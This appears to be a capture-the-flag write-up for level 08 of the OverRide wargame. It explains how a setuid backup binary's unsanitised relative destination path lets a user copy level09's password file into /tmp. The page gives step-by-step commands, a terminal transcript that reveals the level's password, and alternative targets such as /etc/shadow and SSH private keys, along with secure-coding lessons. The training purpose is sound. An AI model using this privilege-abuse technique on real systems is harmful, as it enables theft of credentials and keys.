---
sidebar_position: 10
---

import AsciinemaPlayer from '@site/src/components/AsciinemaPlayer';
import MissionObjective from '@site/src/components/MissionObjective';
import VulnerabilityCard from '@site/src/components/VulnerabilityCard';
import CodeBlock from '@site/src/components/CodeBlock';
import StepsList from '@site/src/components/StepsList';

# 🗂️ Level 08

<MissionObjective 
  level="Level 08"
  target="level09 privileges"
  method="Path manipulation and setuid privilege abuse"
/>

## Vulnerability Analysis

<VulnerabilityCard 
  type="Path Traversal & Setuid Privilege Abuse"
  severity="high"
  description="Binary creates backup copies of files with setuid privileges but lacks path sanitization. By manipulating working directory and folder structure, we can force it to copy restricted files to accessible locations."
  techniques={[
    "Path Manipulation",
    "Setuid Abuse", 
    "Directory Traversal",
    "Relative Path Exploitation"
  ]}
/>

## Program Behavior Analysis

<CodeBlock 
  title="Binary Usage"
  command="./level08 filename"
  output={`Usage: ./level08 <filename>
Program expects a filename as argument
Creates backup in ./backups/ directory`}
/>

**Core Functionality:**
- Reads source file with setuid privileges (level09)
- Creates backup copy in `./backups/` + filename
- No path validation or sanitization
- Relative destination path vulnerable to manipulation

## Source Code Analysis

<CodeBlock 
  title="Pseudocode Logic"
  command="# Simplified program flow"
  output={`FILE *log = fopen("./backups/.log", "w");
fprintf(log, "Starting back up: %s\\n", argv[1]);

FILE *source = fopen(argv[1], "r");  // Read with setuid privileges

char dest[100];
strcpy(dest, "./backups/");
strncat(dest, argv[1], 99 - strlen(dest));  // No path sanitization!

int fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0640);

// Copy file byte by byte
while ((c = fgetc(source)) != EOF) {
    write(fd, &c, 1);
}

fprintf(log, "Finished back up: %s\\n", argv[1]);`}
/>

## Vulnerability Deep Dive

<CodeBlock 
  title="Path Construction Vulnerability"
  command="# Example path construction"
  output={`Input: /home/users/level09/.pass

Source path: /home/users/level09/.pass (absolute)
→ Read with setuid privileges ✓

Destination: ./backups/ + /home/users/level09/.pass
→ ./backups//home/users/level09/.pass (relative to CWD)
→ Controllable by attacker! ✓`}
/>

**Critical Issues:**
1. **No path sanitization**: Argument used directly in file operations
2. **Relative destination**: `./backups/` depends on current working directory
3. **Setuid read privilege**: Can access restricted files
4. **Directory creation**: No validation of destination path components

## Exploitation Strategy

<CodeBlock 
  title="Attack Methodology"
  command="# Exploitation approach"
  output={`1. Choose writable directory (/tmp)
2. Create matching folder structure
3. Manipulate working directory
4. Force program to copy restricted file
5. Read copied content from accessible location`}
/>

## Step-by-Step Exploitation

<StepsList
  title="Path Manipulation Attack"
  steps={[
    {
      title: "Setup Working Directory",
      description: "Move to writable location where we can create folder structure",
      command: "cd /tmp",
      result: "Now in world-writable directory"
    },
    {
      title: "Create Destination Structure", 
      description: "Pre-create the folder path where backup will be written",
      command: "mkdir -p ./backups/home/users/level09/",
      result: "Destination directory structure ready"
    },
    {
      title: "Execute Privilege Abuse",
      description: "Run setuid binary to copy restricted file",
      command: "~/level08 /home/users/level09/.pass",
      result: "File copied with elevated privileges"
    },
    {
      title: "Read Extracted Data",
      description: "Access the copied restricted file content",
      command: "cat ./backups/home/users/level09/.pass",
      result: "level09 password revealed"
    }
  ]}
/>

## Live Demonstration

<AsciinemaPlayer 
  src="https://asciinema.org/a/OxqqUdpwF5lKom85GPgwrJdfh.js" 
  id="asciicast-OxqqUdpwF5lKom85GPgwrJdfh" 
/>



## Complete Exploit Demonstration

<CodeBlock 
  title="Full Exploitation Sequence"
  command="# Complete attack chain"
  output={`level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level08@OverRide:/tmp$ su level09
Password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level09@OverRide:~$ whoami
level09`}
/>

## Technical Analysis

### Path Resolution Mechanics

<CodeBlock 
  title="Understanding Relative vs Absolute Paths"
  command="# How the OS resolves the paths"
  output={`Source: /home/users/level09/.pass
→ Absolute path, resolved from root
→ Setuid binary can read this file

Destination: ./backups//home/users/level09/.pass  
→ Relative to current working directory
→ If CWD is /tmp, actual path becomes:
→ /tmp/backups/home/users/level09/.pass`}
/>

### Setuid Privilege Model

:::tip **How Setuid Exploitation Works**
- **Effective UID**: Process runs with level09 privileges
- **File Access**: Can read files owned by level09
- **Write Operations**: Destination still respects file system permissions
- **Working Directory**: Inherited from calling process (user-controlled)
:::

## Directory Structure Analysis

<CodeBlock 
  title="Required Folder Hierarchy"
  command="tree /tmp/backups/"
  output={`/tmp/backups/
└── home
    └── users
        └── level09
            └── .pass  # This is where our copied file appears

4 directories, 1 file`}
/>

## Alternative Attack Vectors

<CodeBlock 
  title="Other Potential Targets"
  command="# What other files could we copy?"
  output={`~/level08 /etc/passwd
→ Copy system password file

~/level08 /home/users/level09/.ssh/id_rsa  
→ Copy SSH private keys

~/level08 /etc/shadow
→ Copy password hashes (if readable)`}
/>

## Protection Bypass Analysis

### Why Common Defenses Fail

:::warning **Security Mechanism Bypasses**
- **Path Sanitization**: Completely absent in this implementation
- **Chroot/Jail**: Not implemented, absolute paths work normally  
- **Permission Checks**: Only applied to destination, not source
- **Symlink Protection**: No symlink validation performed
:::

## Debugging the Vulnerability

<CodeBlock 
  title="Understanding the Flow with strace"
  command="strace -f ~/level08 /home/users/level09/.pass"
  output={`openat(AT_FDCWD, "/home/users/level09/.pass", O_RDONLY) = 3
openat(AT_FDCWD, "./backups//home/users/level09/.pass", 
       O_WRONLY|O_CREAT|O_TRUNC, 0640) = 4
       
→ Source opened with absolute path
→ Destination opened relative to CWD`}
/>

## Key Learning Points

:::tip **File System Security Concepts**
- **Setuid Binary Analysis**: Understanding privilege inheritance
- **Path Manipulation**: Exploiting relative path construction
- **Working Directory Control**: How CWD affects file operations
- **Privilege Escalation**: Reading restricted files via setuid abuse
:::

## Code Review Lessons

<CodeBlock 
  title="Secure Implementation Requirements"
  command="# What should have been done"
  output={`1. Path sanitization: Reject ../ and absolute paths
2. Destination validation: Ensure writes stay in safe directory
3. Drop privileges: Don't maintain setuid for file copying
4. Canonical paths: Resolve all paths to absolute before use
5. Access controls: Verify user can read source legitimately`}
/>

## Technical Summary

This level demonstrates:
1. **Setuid Binary Analysis** - Understanding privilege inheritance and abuse
2. **Path Manipulation Attacks** - Exploiting relative path construction
3. **File System Security** - Working directory and permission interactions
4. **Privilege Escalation** - Reading restricted files through design flaws
5. **Code Review Skills** - Identifying missing input validation

The vulnerability showcases how seemingly innocent file operations can become security risks when combined with elevated privileges and insufficient input validation. This is a classic example of **confused deputy** problem